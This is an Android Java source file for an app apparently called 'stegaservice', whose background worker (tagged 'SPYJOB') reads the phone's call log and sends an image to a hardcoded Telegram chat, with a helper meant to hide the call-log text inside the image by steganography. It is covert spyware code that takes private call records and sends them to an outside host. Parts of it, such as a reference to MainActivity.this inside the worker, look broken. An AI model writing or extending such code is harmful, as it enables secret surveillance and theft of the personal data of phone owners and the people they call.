package com.example.stegaservice;

import static com.example.stegaservice.TelegramApiClient.initTelegramApi;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextEncodingCallback;
import com.ayush.imagesteganographylibrary.Text.ImageSteganography;
import com.ayush.imagesteganographylibrary.Text.TextEncoding;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;



public class MyWorker extends Worker implements TextEncodingCallback {
    private static final int SELECT_PICTURE = 100;

    private static Uri filepath;
    private final Context context;

    private TextEncoding textEncoding;
    private static Bitmap original_image;
    private static Bitmap encoded_image;


    static final String TAG = "SPYJOB";

    public MyWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d(TAG, "doWork: start");

        try {
            exportCallLog(getApplicationContext());

            TimeUnit.SECONDS.sleep(10);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        Log.d(TAG, "doWork: end");

        return Result.success();
    }

    public static void exportCallLog(Context context) {
        // Check if external storage is available
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            // Get call logs
            String[] projection = {
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
            };

            ContentResolver contentResolver = context.getContentResolver();
            Uri callLogUri = CallLog.Calls.CONTENT_URI;

            StringBuilder callLogData = new StringBuilder();

            try (Cursor cursor = contentResolver.query(callLogUri, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    // Write headers
                    callLogData.append("Number,Date,Duration,Type\n");

                    // Write call log data
                    do {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                        String formattedDate = formatCallLogDate(date);


                        // Append data to StringBuilder
                        callLogData.append(String.format("%s,%s,%s,%s\n", number, formattedDate, duration, type));
                    } while (cursor.moveToNext());

                    // Output the result to Log
                    Log.d("CallLogExporter", "Call log data:\n" + callLogData.toString());
                    //encodeCallLogDataIntoImage(context, callLogData.toString());
                    initTelegramApi();
                    sendPhoto();
                }
            }
        }
    }

    public static String formatCallLogDate(long milliseconds) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Instant instant = Instant.ofEpochMilli(milliseconds);
            LocalDateTime dateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return dateTime.format(formatter);
        } else {
            return "";
        }
    }
    private static void sendPhoto() {
        File photoFile = new File(Environment.getExternalStorageDirectory(), "Encode.png"); // Замените на путь к вашему изображению
        String chatId = "-1002043685204";

        TelegramApiClient.sendPhoto(chatId, photoFile);
    }

    @Override
    public void onStartTextEncoding() {

    }

    @Override
    public void onCompleteTextEncoding(ImageSteganography imageSteganography) {

    }
    public void encodeCallLogDataIntoImage(Context context, String callLogData) throws IOException {

        original_image = MediaStore.Images.Media.getBitmap(context.getContentResolver(), filepath);

        if (original_image != null) {
            // Создаем объект ImageSteganography
            ImageSteganography imageSteganography = new ImageSteganography(callLogData, "123", original_image);
            textEncoding = new TextEncoding(MainActivity.this, MyWorker.this);
            //Executing the encoding
            textEncoding.execute(imageSteganography);
        }
    }
}